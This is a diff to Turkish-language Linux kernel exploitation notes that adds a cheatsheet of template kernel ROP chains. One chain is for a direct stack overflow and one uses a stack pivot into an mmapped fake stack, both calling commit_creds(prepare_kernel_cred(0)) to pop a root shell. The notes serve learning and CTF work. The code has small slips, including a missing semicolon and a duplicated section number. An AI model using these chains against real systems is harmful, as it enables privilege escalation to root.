@@ -131,6 +131,11 @@
         19.6  Stack pivot gadget'indeki adresin son 3 byte'ı 0'dan farklı olmalı
         19.7  mov rdi, rax --> mov edi, eax 'a dönüşüyor ve patlatıyor
         19.8  swapgs_restore_regs_and_return_to_usermode yerine kullanılabilecekler
+    20  Exploitation cheatsheet
+        20.1  Örnek kROP zincirleri
+            20.1.1  Dümdüz stackoverflow
+            20.1.1  Stack pivoting
+
 
 --[1] Önsöz
 
@@ -2289,7 +2294,7 @@
     Belki başka semboller de kullanılabiliyordur. Bunlar tecrübe edildi.
 
 
-[*] Exploitation cheatsheet
+--[20] Exploitation cheatsheet
 
     cpio -id < initramfs        # extract initramfs
     cpio -id < rootfs.cpio      # extract rootfs.cpio
@@ -2297,6 +2302,78 @@
     linux/scripts/extract-vmlinux <kernel image> >vmlinux  # extract vmlinux
                                                              from bzImage or
                                                              vmlinuz
+
+----[20.1] Örnek kROP zincirleri
+
+    commit_creds(prepare_kernel_cred(0)) fonksiyonunun rop hali çoğu zaman aynı.
+    Farklı durumlar için ufak değişiklikler ile kullanmak mümkün.
+
+
+------[20.1.1] Dümdüz stackoverflow
+
+    Stackoverflow yapıp kernel stackini ropchainin tamamı ile ezebiliyorsak
+    (SMAP olsa bile aşıyor zira ropchain kernel stackine yazılıyor):
+
+        ------------------------------------------------------------------------
+        unsigned long *rop;
+
+        *rop++ = pop_rdi_ret;
+        *rop++ = 0x0; /* rdi */
+        *rop++ = prepare_kernel_cred;
+        *rop++ = mov_rdi_rax_ret
+        *rop++ = commit_creds;
+        *rop++ = native_swapgs;
+        *rop++ = native_iret;
+        *rop++ = (unsigned long)&pop_shell;
+        *rop++ = user_cs;
+        *rop++ = user_rflags;
+        *rop++ = user_sp;
+        *rop++ = user_ss;
+
+        stackoverflow_overwrite_kernel_retaddr_with_buf(rop, sizeof(rop));
+        ------------------------------------------------------------------------
+
+
+------[20.1.2] Stack pivoting
+
+    Stack kontrolümüz yoksa ama sadece RIP kontrolümüz varsa stack pivoting
+    yapıp stack'i çalacağız (SMEP var ama SMAP yok):
+
+        ------------------------------------------------------------------------
+        /* 0xffffffff816525c4: mov esp, 0xf6fffffa; ret; */
+        unsigned long stack_pivot = 0xffffffff816525c4;
+        unsigned long fake_stack = 0xf6fffffa;
+
+        unsigned long *_fakefake = mmap(0xf6ff0000, 0x20000,
+                        PROT_READ | PROT_WRITE | PROT_EXEC,
+                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
+       
+
+        /* stack pivot ile zıplayacağımız adresi mmap'ledik, şimdi oraya
+         * ropchainimizi koyacağız 
+         */
+
+        unsigned long *rop;
+        
+        rop = (unsigned long *)fake_stack;
+        *rop++ = pop_rdi_ret;
+        *rop++ = 0x0; /* rdi */
+        *rop++ = prepare_kernel_cred;
+        *rop++ = mov_rdi_rax_ret
+        *rop++ = commit_creds;
+        *rop++ = native_swapgs;
+        *rop++ = native_iret;
+        *rop++ = (unsigned long)&pop_shell;
+        *rop++ = user_cs;
+        *rop++ = user_rflags;
+        *rop++ = user_sp;
+        *rop++ = user_ss;
+
+        /* stack pivot çalıştığı an rsp fake stack'imizi gösterecek ve
+         * pivot'tan ret yapılırken ropchainimize düşeceğiz
+         */
+        somehow_overwrite_kernel_rip(stack_pivot);
+        ------------------------------------------------------------------------
 
 
 vim:set ts=8 sw=4 sts=4 et cc=80 tw=80:
